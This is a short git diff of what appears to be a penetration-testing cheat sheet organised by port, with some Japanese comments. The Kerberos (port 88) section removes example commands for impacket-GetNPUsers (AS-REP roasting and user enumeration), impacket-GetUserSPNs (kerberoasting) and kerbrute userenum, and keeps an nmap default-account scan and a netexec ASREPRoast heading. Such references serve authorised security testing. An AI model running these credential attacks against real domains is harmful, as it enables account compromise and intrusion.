@@ -95,22 +95,9 @@ nmap -n -Pn -p80 -sV --script=http-default-account 'IP'
 
 
 ## 88
-- impacket-GetNPUsers
-```sh
-# userenum & asreproast
-impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -usersfile 'USERLIST' 'DOMAIN'
-impacket-GetNPUsers -outputfile 'FILE' -ts -dc-ip 'IP' -no-pass 'DOMAIN/USERNAME'
-```
+- impacket-GetNPUsers  
 - impacket-GetUserSPNs
-```sh
-# kerberoasting (TCP389番も必要)
-impacket-GetUserSPNs -outputfile 'FILE' -ts -dc-ip 'IP' 'DOMAIN/USERNAME:PASSWORD'
-```
 - kerbrute
-```sh
-# userenum
-./kerbrute_linux_amd64 userenum --dc 'IP' -d 'DOMAIN' 'USERLIST'
-```
 - netexec
 ```sh
 # ASREPRoast (TCP389番も必要)
